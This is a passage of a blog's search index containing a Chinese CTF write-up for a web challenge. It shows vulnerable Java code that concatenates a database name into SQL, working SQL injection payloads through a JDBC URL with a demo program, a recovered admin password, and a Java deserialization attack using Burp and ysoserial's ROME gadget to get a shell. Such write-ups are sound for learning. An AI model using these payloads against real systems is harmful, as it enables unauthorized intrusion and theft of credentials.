 &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Table&gt; <span class="title">getTableData</span><span class="params">(String dbName, String user, String pass)</span> </span>&#123;</span><br><span class="line">        List&lt;Table&gt; Tables = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        Connection conn = getConnection(dbName, user, pass);</span><br><span class="line">        String TableName = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Statement stmt = conn.createStatement();</span><br><span class="line">            DatabaseMetaData metaData = conn.getMetaData();</span><br><span class="line">            ResultSet tableNames = metaData.getTables((String)<span class="keyword">null</span>, (String)<span class="keyword">null</span>, (String)<span class="keyword">null</span>, <span class="keyword">new</span> String[]&#123;<span class="string">"TABLE"</span>&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(tableNames.next()) &#123;</span><br><span class="line">                TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">                Table table = <span class="keyword">new</span> Table();</span><br><span class="line">                String sql = <span class="string">"Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '"</span> + dbName + <span class="string">"' and table_name='"</span> + TableName + <span class="string">"';"</span>;</span><br><span class="line">                ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">                    table.setTableDescribe(rs.getString(<span class="string">"TABLE_COMMENT"</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                table.setTableName(TableName);</span><br><span class="line">                ResultSet data = metaData.getColumns(conn.getCatalog(), (String)<span class="keyword">null</span>, TableName, <span class="string">""</span>);</span><br><span class="line">                ResultSet rs2 = metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="keyword">null</span>, TableName);</span><br><span class="line"></span><br><span class="line">                String PK;</span><br><span class="line">                <span class="keyword">for</span>(PK = <span class="string">""</span>; rs2.next(); PK = rs2.getString(<span class="number">4</span>)) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(data.next()) &#123;</span><br><span class="line">                    Row row = <span class="keyword">new</span> Row(data.getString(<span class="string">"COLUMN_NAME"</span>), data.getString(<span class="string">"TYPE_NAME"</span>), data.getString(<span class="string">"COLUMN_DEF"</span>), data.getString(<span class="string">"NULLABLE"</span>).equals(<span class="string">"1"</span>) ? <span class="string">"YES"</span> : <span class="string">"NO"</span>, data.getString(<span class="string">"IS_AUTOINCREMENT"</span>), data.getString(<span class="string">"REMARKS"</span>), data.getString(<span class="string">"COLUMN_NAME"</span>).equals(PK) ? <span class="string">"true"</span> : <span class="keyword">null</span>, data.getString(<span class="string">"COLUMN_SIZE"</span>));</span><br><span class="line">                    table.list.add(row);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Tables.add(table);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">            var16.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Tables;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>关于这个注入点，需要加#再闭合，或者通过?加个id再闭合(如下)，对此我很是不解，通过赵师傅的指点与写jdbc代码测试才得以搞明白。</p>
+<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">myapp?id=<span class="number">1</span><span class="string">' union select user()#</span></span><br><span class="line"><span class="string">myapp#'</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">user</span>()<span class="comment">#</span></span></span><br></pre></td></tr></table></figure>
+
+<p>我的测试代码如下(可以理解为本题的简化版本)，grade为本地的一个数据库，选择了其中的admins表：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zed.jdbc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcDemo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1、注册驱动</span></span><br><span class="line">        DriverManager.registerDriver(<span class="keyword">new</span> com.mysql.jdbc.Driver());</span><br><span class="line">        <span class="comment">//2、获取链接</span></span><br><span class="line">        String dbname = <span class="string">"grade?id=1' union select user()#"</span>;</span><br><span class="line">        <span class="comment">//或者 String dbname = "grade#' union select user()#";</span></span><br><span class="line">        <span class="comment">//连接数据库</span></span><br><span class="line">        Connection conn = DriverManager.getConnection(<span class="string">"jdbc:mysql://localhost:3306/"</span>+dbname,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        <span class="comment">//3、获取操作数据库的预处理对象</span></span><br><span class="line">        PreparedStatement pstm = conn.prepareStatement(<span class="string">"Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where"</span> +</span><br><span class="line">                <span class="string">"  table_schema = '"</span> + dbname + <span class="string">"' and table_name='admins';"</span>);</span><br><span class="line">        <span class="comment">//4、执行sql语句，得到结果集</span></span><br><span class="line">        ResultSet res = pstm.executeQuery();</span><br><span class="line">        <span class="comment">//5、遍历结果集</span></span><br><span class="line">        <span class="keyword">while</span> (res.next())&#123;</span><br><span class="line">            System.out.println(res.getString(<span class="string">"TABLE_COMMENT"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//6、释放资源</span></span><br><span class="line">        res.close();</span><br><span class="line">        pstm.close();</span><br><span class="line">        conn.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02测试代码分析："><a href="#0x02测试代码分析：" class="headerlink" title="0x02测试代码分析："></a>0x02测试代码分析：</h4><p>在JDBC中，连接数据库的时候采用了?来进行参数传递，如果但是不会影响数据库是否成功连接。例如：</p>
+<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://localhost:3306/数据库名?user=用户名<span class="variable">&amp;password</span>=密码<span class="variable">&amp;useUnicode</span>=true<span class="variable">&amp;characterEncoding</span>=utf-8<span class="variable">&amp;serverTimezone</span>=GMT</span><br></pre></td></tr></table></figure>
+
+<p>?后面的字符串都会被当作参数来进行传递，所以当 <code>dbname=&quot;grade?id=1&#39; union select user()#&quot;</code> 时，</p>
+<p><code>1&#39; union select user()#</code> 都被当做id的值，但是不影响数据库的连接，然后在下面执行sql语句的时候  <code>union select user()#</code> 都作为了sql语句执行，达成了sql注入。使用#同理。</p>
+<p>最终输入在swagger-ui.html的/common/test/sqlDict接口中输入<code>myapp#&#39; union select pwd from user#</code>获得密码为 admin@Rrrr_ctf_asde 。</p>
+<h4 id="0x03登录获取token"><a href="#0x03登录获取token" class="headerlink" title="0x03登录获取token"></a>0x03登录获取token</h4><p>在/common/user/login中登录获取到Bearer。</p>
+<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/login.png" alt="1590733597113">Bearer是用户json数据序列化的结果，将Bearer后面的字符串base64decode的结果如下，明显的java序列化后的格式，这里就可能出现反序列化的漏洞，既然是登录用的，那么就在/common/user/current中应该会触发反序列化，那么在这个接口中的Authorization中输入这一串data，然后Try it out!抓包。</p>
+<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/serialize.png" alt="1590733804094"></p>
+<h4 id="0x04反序列化利用的环境配置"><a href="#0x04反序列化利用的环境配置" class="headerlink" title="0x04反序列化利用的环境配置"></a>0x04反序列化利用的环境配置</h4><p>先在burp中安装  Java Deserialization Scanner插件，该插件在burp的BApp Store可以找到。然后配置ysoserial，先上<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">github</a>下载相关源代码，再使用 <code>mvn clean package -DskipTests</code> 进行编译，最后在burp中的 Java Deserialization Scanner插件下配置路径，例如：</p>
+<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/ysoserial.png" alt="1590734238883"></p>
+<h4 id="0x05反序列化利用-amp-amp-get-flag"><a href="#0x05反序列化利用-amp-amp-get-flag" class="headerlink" title="0x05反序列化利用&amp;&amp;get flag"></a>0x05反序列化利用&amp;&amp;get flag</h4><p>由于复现是在buuoj下复现的，靶机都处于内网环境，所以先开个小号去申请个内网服务器用来接收shell。</p>
+<p>在burp中，将抓到的包发送到装好的插件中</p>
+<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/SendRequestToDS.png" alt="1590734455390"></p>
+<p>将Bearer后的字符串 Set Insertion Point，然后Attack(Base64)，在右边可以看到可利用的ROME。</p>
+<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/serializePoc.png" alt="1590734607131"></p>
+<p>将当前包发送到Exploiting</p>
+<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/serializeExp.png" alt="1590734722286"></p>
+<p>然后构造payload执行，ip端口为buuoj中申请的内网靶机的ip与监听的端口。</p>
+<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/exp.png" alt="1590734801498"></p>
+<p>最后成功接收到flag</p>
+<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/flag.png" alt="1590734861991"></p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
       </tags>
   </entry>
 </search>
